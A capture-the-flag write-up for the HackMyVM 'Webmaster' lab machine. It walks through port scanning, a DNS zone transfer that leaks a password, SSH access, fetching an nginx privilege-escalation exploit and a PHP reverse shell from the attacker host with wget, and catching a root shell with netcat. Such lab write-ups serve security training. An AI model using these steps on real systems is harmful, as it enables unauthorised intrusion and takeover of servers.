---
Title: Write up for https://hackmyvm.eu/machines/machine.php?vm=Webmaster 
date: 12/07/2022 
---
<h1 align="center" style="font-size:30px;">
  <br>
  <a href="https://downloads.hackmyvm.eu/webmaster.zip">Webmaster</a>
  <br>
</h1>


## Net Discover & NMAP
First thinks first

```console
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ sudo netdiscover -r 10.1.1.1/24 -i eth0 
 Currently scanning: 10.1.1.0/24   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                            
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.1.1.1        08:00:27:12:9a:21      1      60  PCS Systemtechnik GmbH                                                                                                                                                                   
 10.1.1.25       08:00:27:fd:4b:b0      1      60  PCS Systemtechnik GmbH   

┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ ip=10.1.1.25 && url=http://$ip   

┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ nmap -v -T5 -p- -sC -sV -oN nmap-$ip.log $ip; clear; cat nmap-$ip.log                                                                                                                                                              130 ⨯
# Nmap 7.92 scan initiated Tue Jul 12 14:13:50 2022 as: nmap -v -T5 -p- -sC -sV -oN nmap-10.1.1.25.log 10.1.1.25
Nmap scan report for webmaster.hmv (10.1.1.25)
Host is up (0.00019s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  (unknown banner: not currently available)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
| dns-nsid: 
|_  bind.version: not currently available
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.92%I=7%D=7/12%Time=62CD577B%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,52,"\0P\0\x06\x85\0\0\x01\0\x01\0\x01\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\x18\x17not\x20curren
SF:tly\x20available\xc0\x0c\0\x02\0\x03\0\0\0\0\0\x02\xc0\x0c");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 12 14:14:16 2022 -- 1 IP address (1 host up) scanned in 26.13 seconds
```
Since We have http port open we will need to do some enumerations with feroxbuster
## FEROXBUSTER
```console
feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u $url -t 500 -o ferox-$ip-full.log

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.1.1.25
 🚀  Threads               │ 500
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox-10.1.1.25-full.log
 💲  Extensions            │ [txt, php, html, zip, htm, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET     1678l    10043w   466543c http://10.1.1.25/comic.png
200      GET        2l        4w       57c http://10.1.1.25/
200      GET        2l        4w       57c http://10.1.1.25/index.html

```

## HTTP
Visiting the website we see an image stating that the 3rd user stores his password in TXT.
After inspecting the page source we found :
```console
 <img src="comic.png" alt="comic"> 
<!--webmaster.hmv-->
```
That means we have to add this domain to our hostfile
```console
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ sudo sh -c "echo '10.1.1.25     webmaster.hmv' >> /etc/hosts"
```

```console
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ dig axfr @10.1.1.25 webmaster.hmv    

; <<>> DiG 9.18.4-2-Debian <<>> axfr @10.1.1.25 webmaster.hmv
; (1 server found)
;; global options: +cmd
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.
ftp.webmaster.hmv.      604800  IN      CNAME   www.webmaster.hmv.
john.webmaster.hmv.     604800  IN      TXT     "M***(deducted)**d"
mail.webmaster.hmv.     604800  IN      A       192.168.0.12
ns1.webmaster.hmv.      604800  IN      A       127.0.0.1
www.webmaster.hmv.      604800  IN      A       192.168.0.11
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
;; Query time: 4 msec
;; SERVER: 10.1.1.25#53(10.1.1.25) (TCP)
;; WHEN: Tue Jul 12 14:23:08 EEST 2022
;; XFR size: 8 records (messages 1, bytes 274)

```

# SSH

Using the password from the TXT Record we ssh to the box with user john

```console
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ ssh john@$ip                                                              
john@10.1.1.25's password: 
Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 12 07:00:39 2022 from 10.1.1.11
john@webmaster:~$ ls
flag.sh  user.txt
john@webmaster:~$ ./flag.sh #you will get the 1st Flag
john@webmaster:~$ sudo -l
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

## Searching for nginx Local Privilage Escalation

```console
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ searchsploit nginx   
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path                                
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nginx (Debian Based Distros + Gentoo) - 'logrotate' Local Privilege Escalation                                                          | linux/local/40768.sh
                                                                                                                                                                                                                                             
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ searchsploit -m 40768
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ mv 40768.sh exploit.sh 
```

## Upload the exploit to the machine.
```console
──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..

john@webmaster:/tmp$ wget 10.1.1.11/exploit.sh
--2022-07-12 07:35:41--  http://10.1.1.11/exploit.sh
Connecting to 10.1.1.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7244 (7.1K) [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                                                  100%[========================================================================================================================================>]   7.07K  --.-KB/s    in 0s      

2022-07-12 07:35:41 (869 MB/s) - ‘exploit.sh’ saved [7244/7244]
john@webmaster:/tmp$ chmod +x exploit.sh
```

# Exploit usage:
from script's comments we get ./nginxed-root.sh path_to_nginx_error.log

```console
john@webmaster:/tmp$ find / -name error.log 2>/dev/null
/var/log/nginx/error.log
john@webmaster:/tmp$ ./exploit.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
                       \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.
             .-XXX(   O   O  )XXXXXXXXXXXXXXX-
            /XXX(       U     )        XXXXXXX          /XXXXX(              )--_  XXXXXXXXXXX         /XXXXX/ (      O     )   XXXXXX   \XXXXX         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247)                                                                                                                                                         
nginxed-root.sh (ver. 1.0)                                                                                                                                                                                                                   
                                                                                                                                                                                                                                             
Discovered and coded by:                                                                                                                                                                                                                     
                                                                                                                                                                                                                                             
Dawid Golunski                                                                                                                                                                                                                               
https://legalhackers.com                                                                                                                                                                                                                     

[+] Starting the exploit as: 
uid=1000(john) gid=1000(john) groups=1000(john),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

[!] You need to execute the exploit as www-data user! Exiting.
```

## Reverse Shell
Since we have access to /var/www/html lets try to upload a RS and get this www-data user.
I personaly use Pentest monkey.

```console
┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


john@webmaster:/tmp$ wget 10.1.1.11/shell.php
--2022-07-12 07:41:04--  http://10.1.1.11/shell.php
Connecting to 10.1.1.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5493 (5.4K) [application/octet-stream]
Saving to: ‘shell.php’

shell.php                                                   100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      

2022-07-12 07:41:04 (110 MB/s) - ‘shell.php’ saved [5493/5493]

john@webmaster:/tmp$ cp shell.php /var/www/html/

┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ nc -nlvp 8888
listening on [any] 8888 ...

-bash: curl: command not found
john@webmaster:/tmp$ wget localhost/shell.php
--2022-07-12 07:43:54--  http://localhost/shell.php
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:80... connected.
HTTP request sent, awaiting response... 


┌──(coolatos㉿CooLaToS)-[~/HMV/webmaster]
└─$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.1.1.11] from (UNKNOWN) [10.1.1.25] 56642
Linux webmaster 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64 GNU/Linux
 07:43:54 up  1:16,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
john     pts/0    10.1.1.11        07:34    0.00s  0.04s  0.00s wget localhost/shell.php
uid=0(root) gid=0(root) groups=0(root)
bash: cannot set terminal process group (361): Inappropriate ioctl for device
bash: no job control in this shell
root@webmaster:/# cd
cd
root@webmaster:~# pwd
/root
pwd
root@webmaster:~# ls
ls
flag.sh
root.txt
root@webmaster:~# ./flag.sh
./flag.sh
```
